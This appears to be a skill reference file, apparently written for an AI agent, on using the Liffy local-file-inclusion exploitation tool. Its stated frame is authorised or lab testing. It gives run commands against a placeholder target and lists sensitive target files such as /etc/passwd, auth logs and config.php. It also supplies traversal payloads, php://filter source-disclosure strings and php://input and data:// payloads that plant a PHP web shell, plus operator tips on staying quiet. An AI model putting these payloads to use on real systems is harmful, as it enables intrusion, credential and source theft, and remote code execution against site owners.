---
name: liffy
description: "Auth/lab ref: Liffy LFI/path traversal validation; wrappers, /proc, log artifacts, file-read evidence, WAF-aware replay notes."
license: MIT
compatibility: "Linux / macOS / Windows; Python 3."
metadata:
  author: AeonDave
  version: "1.0"
---

# liffy

Modern LFI exploitation tool — file read, wrappers, log poisoning, `/proc` tricks, WAF bypass.

## Quick Start

```bash
git clone https://github.com/mzfr/liffy
cd liffy
python3 liffy.py -u "http://target.com/index.php?page=" -x /etc/passwd

# Interactive exploitation flow
python3 liffy.py -u "http://target.com/index.php?page="
```

## Core Use Cases

| Goal | Technique |
|------|-----------|
| Read local files | Traversal + direct file inclusion |
| Read PHP source | `php://filter/convert.base64-encode/resource=` |
| Log poisoning → RCE | Apache/Nginx/SSH auth logs |
| Process env RCE | `/proc/self/environ` |
| Session poisoning | PHP session file inclusion |
| Wrapper abuse | `php://input`, `data://`, `expect://` |

## High-Value Targets

```bash
/etc/passwd
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
/var/lib/php/sessions/sess_<id>
/var/www/html/config.php
```

## Manual Payloads to Confirm First

```bash
# Basic traversal
?file=../../../../etc/passwd
?file=..%2f..%2f..%2fetc%2fpasswd
?file=....//....//etc/passwd

# Source disclosure
?file=php://filter/convert.base64-encode/resource=index.php

# PHP input execution (if include() on request body)
POST /vuln.php?page=php://input
<?php system($_GET['cmd']); ?>

# Data wrapper
?file=data://text/plain,<?php system($_GET['cmd']); ?>
```

## Operator Notes

- Confirm plain file read manually before trying wrapper/RCE paths.
- Prefer `php://filter` early; source disclosure is quieter than poisoning.
- Log poisoning requires a writable log plus later inclusion of that log path.
- Session poisoning is often better than access-log poisoning on shared hosting.

## References

- LFI payloads and paths: `references/lfi-techniques.md`
- [liffy repository](https://github.com/mzfr/liffy)
